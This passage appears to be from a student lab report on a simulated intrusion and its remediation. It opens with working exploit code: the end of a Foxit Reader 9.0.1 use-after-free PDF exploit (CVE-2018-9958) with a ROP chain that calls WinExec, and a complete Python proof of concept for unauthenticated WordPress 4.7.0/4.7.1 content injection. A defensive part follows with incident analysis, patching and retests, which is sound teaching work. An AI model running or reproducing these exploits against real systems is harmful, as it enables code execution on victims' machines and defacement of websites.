do it a few times for reliability.  All gadgets are from FoxitReader.exe v9.0.1.1049 (a01a5bde0699abda8294d73544a1ec6b4115fa68)  */   var arr = new Array(0x10);  for (var i = 0; i &lt; arr.length; i++) {  arr[i] = new ArrayBuffer(0x60);  var rop = new Int32Array(arr[i]);   rop[0x00] = heap_ptr; // pointer to our stack pivot from the TypedArray leak  rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret  rop[0x02] = 0x72727272; // junk  rop[0x03] = foxit_base + 0x00001450 // pop ebp; ret  rop[0x04] = 0xffffffff; // ret of WinExec  rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret  rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec  rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret  rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret  rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret  rop[0x0a] = foxit_base + 0x0041c6ca; // ret  rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret  rop[0x0c] = 0x636c6163; // calc  rop[0x0d] = 0x00000000; // adios, amigo   for (var j = 0x0e; j &lt; rop.length; j++) {  rop[j] = 0x71727374;  }  } }  function trigger_uaf(){  /*  Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability  ZDI-CAN-5620 / ZDI-18-342 / CVE-2018-9958  Found by: Steven Seeley (mr_me) of Source Incite  */   var that = this;  var a = this.addAnnot({type:&quot;Text&quot;, page: 0, name:&quot;uaf&quot;});  var arr = [1];  Object.defineProperties(arr,{  &quot;0&quot;:{  get: function () {   // free  that.getAnnot(0, &quot;uaf&quot;).destroy();   // reclaim freed memory  reclaim();  return 1;  }  }  });   // re-use  a.point = arr; }  function main(){   // 1. Leak a heap chunk of size 0x40  leak_heap_chunk();   // 2. Leak vtable and calculate the base of Foxit Reader  leak_vtable();   // 3. Then fill the memory region from step 1 with a stack pivot  control_memory();   // 4. Trigger the uaf, reclaim the memory, pivot to rop and win  trigger_uaf(); }  if (app.platform == &quot;WIN&quot;){  if (app.isFoxit == &quot;Foxit Reader&quot;){  if (app.appFoxitVersion == &quot;9.0.1.1049&quot;){  main();  }  } }  )&gt;&gt; trailer &lt;&lt;/Root 1 0 R&gt;&gt;    Content injection exploit  # 2017 - @leonjza # # Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC # Full bug description: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html   # Usage example: # # List available posts: # # $ python3 inject.py http://localhost:8070/ # * Discovering API Endpoint # * API lives at: http://localhost:8070/wp-json/ # * Getting available posts #  - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1 # # Update post with content from a file: # # $ cat content # foo # # $ python3 inject.py http://localhost:8070/ 1 content # * Discovering API Endpoint # * API lives at: http://localhost:8070/wp-json/ # * Updating post 1 # * Post updated. Check it out at http://localhost:8070/archives/1 # * Update complete!   import json import sys from urllib.request import urlopen, Request   from lxml import etree     def get_api_url(wordpress_url):     response = urlopen(wordpress_url)       data = etree.HTML(response.read())     u = data.xpath(&#39;//link[@rel=&quot;https://api.w.org/&quot;]/@href&#39;)[0]       # check if we have permalinks     if &#39;rest_route&#39; in u:         print(&#39; ! Warning, looks like permalinks are not enabled. This might not work!&#39;)       return u     def get_posts(api_base):     respone = urlopen(api_base + &#39;wp/v2/posts&#39;)     posts = json.loads(respone.read().decode(&#39;utf-8&#39;))       for post in posts:         print(&#39; - Post ID: {0}, Title: {1}, Url: {2}&#39;               .format(post[&#39;id&#39;], post[&#39;title&#39;][&#39;rendered&#39;], post[&#39;link&#39;]))     def update_post(api_base, post_id, post_content):     # more than just the content field can be updated. see the api docs here:     # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post     data = json.dumps({         &#39;content&#39;: post_content     }).encode(&#39;utf-8&#39;)       url = api_base + &#39;wp/v2/posts/{post_id}/?id={post_id}abc&#39;.format(post_id=post_id)     req = Request(url, data, headers={&#39;Content-Type&#39;: &#39;application/json&#39;})     response = urlopen(req).read()       print(&#39;* Post updated. Check it out at {0}&#39;.format(json.loads(response.decode(&#39;utf-8&#39;))[&#39;link&#39;]))     def print_usage():     print(&#39;Usage: {0} &lt;url&gt; (optional: &lt;post_id&gt; &lt;file with post_content&gt;)&#39;.format(__file__))     if __name__ == &#39;__main__&#39;:       # ensure we have at least a URL     if len(sys.argv) &lt; 2:         print_usage()         sys.exit(1)       # if we have a post id, we need content too     if 2 &lt; len(sys.argv) &lt; 4:         print(&#39;Please provide a file with post content with a post id&#39;)         print_usage()         sys.exit(1)       print(&#39;* Discovering API Endpoint&#39;)     api_url = get_api_url(sys.argv[1])     print(&#39;* API lives at: {0}&#39;.format(api_url))       # if we only have a URL, show the posts we have     if len(sys.argv) &lt; 3:         print(&#39;* Getting available posts&#39;)         get_posts(api_url)           sys.exit(0)       # if we get here, we have what we need to update a post!     print(&#39;* Updating post {0}&#39;.format(sys.argv[2]))     with open(sys.argv[3], &#39;r&#39;) as content:         new_content = content.readlines()       update_post(api_url, sys.argv[2], &#39;&#39;.join(new_content))       print(&#39;* Update complete!&#39;)         Part [3] Defensive Cybersecurity  1. Conduct an Analysis of the Systems 1.1 Overview of Systems UVPN company operates a network infrastructure that contains multiple operating systems like 2 windows machine , Lubuntu  and Pfsense firewall 2.1.3 that is based on FreeBSD operating system, the company&#39;s Network architecture is hybrid containing FTP and MySQL on-premises and S3 storage service running on AWS platform and WEB service running on Ubuntu OS on Azure platform which is both a cloud-based service the employees use day-to-day operations, and all the machines are set up to forward logs to cloud-based Splunk. 1.2 Incident Discovery In 17/Nov/2023 at 7:00, we the security team UVPN company, got a call from the employees saying their devices got infected with calculators&#39; “Ransomware” and edited content on the company’s webpage that was not edited by any employee. 1.3 Artifacts Splunk search, and reporting section that revealed a series of unauthorized logins, hostile Scans and an API log indicating a content injection attack on the WEB server   Network Traffic:  abnormal traffic coming from the attacker with public IP that contains WPscan scanning traffic trying to scan our WordPress site, and follow that an unauthenticated POST request to the WordPress REST API endpoint &quot;POST /index.php/wp-json/wp/v2/posts/1/?id=1abc HTTP/1.1&quot;  that is responsible for creating and updating pages and posts leading to content injection on the post with the ( Id = 1 )  /                     here we can see the attacker is trying to scan the company’s WordPress using WPscan tool   /               and here is the log that show the content injection attack that was performed  User Accounts: anonymous access to FTP server with clear text credentials led to unauthorized login attempts using the credentials were seen on Splunk search showing unauthorized access to the telnet service that was running on the one of the employees&#39; machines (lub) that led to another unauthorized login to the firewall as the same user (lub)/  here we can see the events that show the IP (192.168.1.6) which is unknown IP to the system (the attacker) attempting multiple failed logins into the FTP server until he got the access through anonymous login ,the ftp contains sensitive information such as telnet password/                     here we can see the attacker accessed lub machine through its telnet service  /                 Here we can see what did the attacker do and the commands he entered after accessing the machine                              /             the attacker is checking the login webpage of the pfsense firewall here he logged in as lub and is being redirected to ”diag_testport.php”   here is another login from the attacker into the user ”diagnoser” that has higher privileges                         we can see here the attacker is monitoring the traffic of the whole local network      Malicious Files: files with weird names the attacker left on the firewall, PDF with Malicious code found on the Tasks post (id =1) on WordPress site and on the employees with Windows OS named “results” that you can download through a link the attacker putted on the post to trick the employees into downloading it to check the results./ here is the added content the attacker putted which is a link to download the PDF with the payload inside it/                  here we can see the calculator” ransomware” has been deployed on the employees&#39; machines due to opening it     / And unknown empty directory with suspicious name found in the /usr/local/www indicates a failure attempt on creating a reverse shell               Attack Timeline:   The MITRE ATTACK Navigator Mapping    Remediation:    Vulnerability 1 #: Command Injection, Privilege Escalation and Password Hash Weakness The Remedition of these vulnerabilities is to upgrade the pfsense firewall to 2.1.5 or the   latest which we will do in our case / And here its upgraded to latest version and fixed all the vulnerabilities mentioned above  The command injection was fixed through the next details   “The srcport value is now checked to ensure that it is a valid port number.” “The srcport value is now escaped before being passed to the exec() function.”  The Password Hash Weakness was fixed through the next details: using the Bcrypt algorithm to hash user passwords instead of MD5. bcrypt is a stronger hashing algorithm that is more resistant to brute-force attacks and rainbow table attacks.         Vulnerability 2 #: Content Injection Upgrade to 4.8.0 or the latest which we will do   / Download the latest package WordPress / To protect from such vulnerability is update to the 4.7.2 version or the latest version, which will prevent any content injection attack, the update contains implementation of input validation in the REST API endpoints, that will check any request for editing or updating ether pages or posts (anything editable), plus the WordPress software now will validate the data too to make sure it does not contain any malicious code. If the any attack try injects malicious data through the API, the WordPress new version will reject the injection and stop the malicious code from being stored in the database or displayed on the website Vulnerability 3 #: Use-After-Free (UAF) Upgrade to Foxit 10.1.0 or the latest which we will do in this case / Foxit Reader has improved memory management by using smart pointers and a secure memory allocator, protecting from any memory leaks. Plus, Foxit now includes enhanced security checks, such as verifying pointer validity before removal and memory access.   Vulnerability 4#: Clear Text Credentials &amp; anonymous login Moving any sensitive information on the FTP server and disabling anonymous login making sure no unauthorized access to FTP nor Telnet  / Making only authenticated people able to access the FTP server and removing any sensitive information out of the FTP to somewhere else.  	       Performing the attack after the remediation implantation  Since the attack is based on a scenario where you need to perform an exploit vulnerability to get to the other vulnerability, we will start in reverse.  Vulnerability 1 #: Command injection   Unable to load the graphic  -and as you can see, the command injection vulnerability was fixed here  Vulnerability 2 #: Content Injection   / “400 Bad Request response status code indicates that the server cannot or will not process the request due to something that is perceived to be a client error “  Vulnerability 3 #: Use-After-Free (UAF)   / Here after the employee opened the PDF with the payload, nothing happened  Other Vulnerability #: Clear Text Credentials &amp; anonymous login  / / And for the clear Credentials must be hashed or compressed with strong password policy, in our case it was removed in case even if he got the access somehow, he won&#39;t find any sensitive information /      </pre>
</details>